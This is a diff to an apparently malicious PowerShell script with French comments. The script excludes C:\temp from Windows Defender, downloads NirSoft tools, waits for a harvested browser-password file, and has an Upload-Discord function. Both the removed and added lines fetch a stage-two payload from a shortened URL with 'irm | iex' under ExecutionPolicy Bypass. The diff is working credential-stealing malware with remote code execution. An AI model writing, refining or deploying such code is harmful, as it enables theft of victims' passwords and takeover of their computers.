@@ -85,6 +85,26 @@ function Upload-Discord {
     }
 }
 
+
+# Chemin du fichier à surveiller
+$filePath = "c:\temp\w3b_br0ws3r_p4ssw0rds.txt"
+
+# Fonction pour attendre la création du fichier
+function Wait-FileCreation {
+    param (
+        [string]$Path,
+        [int]$TimeoutInSeconds = 60
+    )
+
+    $timeout = (Get-Date).AddSeconds($TimeoutInSeconds)
+
+    while (!(Test-Path $Path) -and (Get-Date) -lt $timeout) {
+        Start-Sleep -Seconds 1
+    }
+
+    return (Test-Path $Path)
+}
+
 # Call TempDir function
 TempDir
 
@@ -94,5 +114,10 @@ Add-MpPreference -ExclusionPath "C:\temp"
 # Call Get-Nirsoft function to download Nirsoft tools
 Get-Nirsoft
 
-#Calling the stage2
-powershell -w h -NoP -Ep Bypass $dc=$dc;$db=$db;irm https://shorturl.at/rLQS5 | iex
+# Attendre que le fichier soit créé
+if (Wait-FileCreation -Path $filePath) {
+    # Le fichier a été créé, exécuter la commande
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "$dc='${dc}'; $db='${db}'; irm https://shorturl.at/rLQS5 | iex"
+} else {
+    Write-Host "Le fichier n'a pas été créé dans le délai imparti."
+}
